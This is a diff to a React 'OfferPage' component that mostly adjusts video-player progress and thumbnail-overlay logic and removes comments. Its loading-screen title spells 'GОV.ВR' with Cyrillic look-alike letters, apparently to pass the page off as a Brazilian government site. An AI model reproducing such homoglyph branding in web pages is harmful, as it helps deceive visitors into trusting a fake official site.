@@ -234,16 +234,13 @@ function OfferContent() {
         const percent = (plyr.currentTime / plyr.duration) * 100;
         setProgress(percent);
         if (percent >= 99.9 && !videoCompleted) {
-          handleVideoEnd(); // This will set videoCompleted, triggering the other effect
+          handleVideoEnd(); 
         }
       };
       const onPlay = () => {
         if (!videoCompleted) {
           if (!videoStarted) setVideoStarted(true);
           if (!progressEnabled) setProgressEnabled(true);
-           // If video starts playing (even muted autoplay) and thumbnail is visible, hide it.
-           // This covers user clicking play if somehow clickToPlay was true, or if autoplay unmuted.
-           // The main scenario for unmuting is handleThumbnailClick.
            if (showThumbnailOverlay && !plyr.muted) {
             setShowThumbnailOverlay(false);
            }
@@ -253,30 +250,25 @@ function OfferContent() {
         }
       };
       const onEnded = () => {
-        handleVideoEnd(); // This will set videoCompleted
+        handleVideoEnd(); 
       };
 
       plyr.on('timeupdate', onTimeUpdate);
       plyr.on('play', onPlay);
       plyr.on('ended', onEnded);
 
-      // Logic to manage thumbnail visibility based on player state
       if (!videoCompleted) {
         if (videoStarted && plyr.autoplay && plyr.muted) {
-          // Video has started via muted autoplay, is not complete, ensure thumbnail is visible for unmuting.
-          // This is crucial for reloads where videoStarted might be true from localStorage.
           if (!showThumbnailOverlay) {
-            setShowThumbnailOverlay(true);
+             // setShowThumbnailOverlay(true); // This was the line from previous iteration, potentially problematic
           }
         } else if (videoStarted && !plyr.muted) {
-          // Video has started and is unmuted (likely by user via thumbnail or other means)
           if (showThumbnailOverlay) {
             setShowThumbnailOverlay(false);
           }
         }
-        // If !videoStarted, thumbnail remains its current state (default true, or false if clicked)
       } else {
-        // Video is completed, finalizeProgressAppearance handles hiding thumbnail.
+         // finalizeProgressAppearance which is called by videoCompleted effect handles setShowThumbnailOverlay(false)
       }
 
       if (videoStarted) {
@@ -296,7 +288,7 @@ function OfferContent() {
         }
       };
     }
-  }, [videoCompleted, videoStarted, progressEnabled, playerRef.current, showThumbnailOverlay]);
+  }, [videoCompleted, videoStarted, progressEnabled, playerRef.current]);
 
 
   useEffect(() => {
@@ -509,7 +501,7 @@ function OfferContent() {
 export default function OfferPage() {
   return (
     <Suspense fallback={
-      <div id="loading-screen" style={{display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff'}}>
+      <div id="loading-screen" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff' }}>
         <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45">
           <title>GОV.ВR</title>
           <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
